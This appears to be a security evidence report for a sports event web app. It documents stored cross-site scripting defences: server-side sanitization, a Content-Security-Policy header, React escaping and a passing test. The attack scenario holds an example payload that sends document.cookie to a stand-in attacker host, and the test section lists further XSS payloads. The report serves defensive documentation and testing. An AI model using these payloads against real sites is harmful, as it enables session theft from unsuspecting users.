# Evidence 04: Cross-Site Scripting (XSS) Sanitization Defense

## Classification
- **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **OWASP Top 10:** A03:2021 – Injection

## Attack Scenario (Before Hardening)
In sports discovery applications, venue managers and players submit rich descriptions for tournaments, events, and venues. In an insecure application, an attacker creates an event titled:
```html
Soccer Match <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script><img src=x onerror=alert(document.domain)>
```
When other users or administrators browse the events feed or venue detail page, the browser renders the unsanitized HTML, executing the script in the context of the victim's session. This allows session token exfiltration, unauthorized bookings, and defacement.

## Defensive Implementation
1. **Server-Side HTML Sanitization:**
   All text fields entering the API are sanitized using `sanitize-html` configured with an allowlist of harmless text formatting:
```typescript
const cleanTitle = sanitizeHtml(input.title, { allowedTags: [], allowedAttributes: {} });
const cleanDescription = sanitizeHtml(input.description, {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
  allowedAttributes: {},
});
```
   All `<script>`, `<iframe>`, `object`, and inline event attributes (`onerror`, `onload`, `onclick`) are completely stripped prior to database persistence.
2. **Defensive Content-Security-Policy (CSP):**
   Both Express Helmet and Nginx proxy inject strict CSP headers preventing execution of unauthorized scripts:
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https://images.unsplash.com; connect-src 'self'; frame-ancestors 'none'; object-src 'none';
```
3. **Client-Side Safe Rendering:** React automatically escapes all interpolated expressions in JSX (`{event.title}`).

## Verification Procedure
The security test suite (`server/tests/security/security.test.ts` - `TEST 4`):
1. Submits an event creation POST payload with embedded `<script>alert("XSS")</script>`, `<img src=x onerror=alert(1)>`, and `<iframe src="javascript:alert(1)"></iframe>`.
2. Verifies the event is created (`201 Created`).
3. Fetches the stored event via `GET /api/events/:id`.
4. Asserts that the response body does not contain `<script>`, `<img`, `onerror`, or `<iframe`, while harmless content (`"Clean Description"`) is preserved.

### Test Result
```
✓ TEST 4: Stored XSS payloads must be neutralized and stripped of all executable tags (13ms)
```
